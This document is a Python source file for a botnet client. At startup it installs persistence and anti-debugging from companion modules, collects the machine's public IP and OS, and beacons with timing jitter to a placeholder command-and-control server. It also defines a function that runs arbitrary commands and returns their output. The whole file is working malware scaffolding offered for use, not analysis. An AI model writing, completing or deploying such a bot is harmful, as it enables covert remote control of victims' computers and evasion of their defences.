# bot/bot.py
import requests
import subprocess
import platform
import os
import time
import random
import logging
import json
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from bot.persistence import add_persistence
from bot.stealth import anti_debugging
from bot.encryption import SecureEncryption

logging.basicConfig(level=logging.INFO)

def resolve_server_url():
    # For advanced dynamic resolution, you might integrate DNS or other dead-drop mechanisms.
    return "https://your-server-ip:5000"

SERVER_URL = resolve_server_url()

# Generate an ECDH key pair (for future secure channels)
private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
public_key_pem = private_key.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

def checkin():
    try:
        ip = requests.get("https://api.ipify.org").text
        os_info = platform.system()
        data = {
            "ip": ip,
            "os": os_info,
            "public_key": public_key_pem.decode(),
            "group": "default"
        }
        response = requests.post(f"{SERVER_URL}/checkin", json=data, verify=True)
        if response.status_code == 200:
            logging.info("Checkin successful.")
        else:
            logging.warning(f"Checkin failed with status code {response.status_code}.")
    except Exception as e:
        logging.error(f"Checkin error: {e}")

def execute_command(command):
    try:
        result = subprocess.run(command, shell=False, capture_output=True, text=True)
        return json.dumps({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode
        })
    except Exception as e:
        return json.dumps({"error": str(e)})

if __name__ == "__main__":
    add_persistence()
    anti_debugging()
    checkin_interval = 60 + random.randint(-5, 5)  # Add jitter
    while True:
        checkin()
        time.sleep(checkin_interval)
